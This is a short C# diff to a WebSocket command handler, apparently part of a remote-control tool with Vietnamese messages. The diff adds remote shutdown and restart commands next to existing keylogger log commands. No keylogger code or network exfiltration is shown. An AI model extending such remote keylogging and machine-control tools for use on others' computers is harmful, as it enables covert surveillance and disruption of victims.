@@ -135,6 +135,13 @@ namespace WebSocketTest
                     case "keylog_clear":
                         KeyLoggerService.ClearLogs();
                         return JsonSuccess("Đã xóa file log.");
+                    // --- SHUTDOWN / RESTART COMMANDS ---
+                    case "shutdown":
+                        ShutdownRestart.Shutdown();
+                        return JsonSuccess("Lệnh tắt máy đã được gửi."); 
+                    case "restart":
+                        ShutdownRestart.Restart();
+                        return JsonSuccess("Lệnh khởi động lại đã được gửi.");   
                 }
             }
             catch (Exception ex) { return JsonError("Lỗi Server: " + ex.Message); }
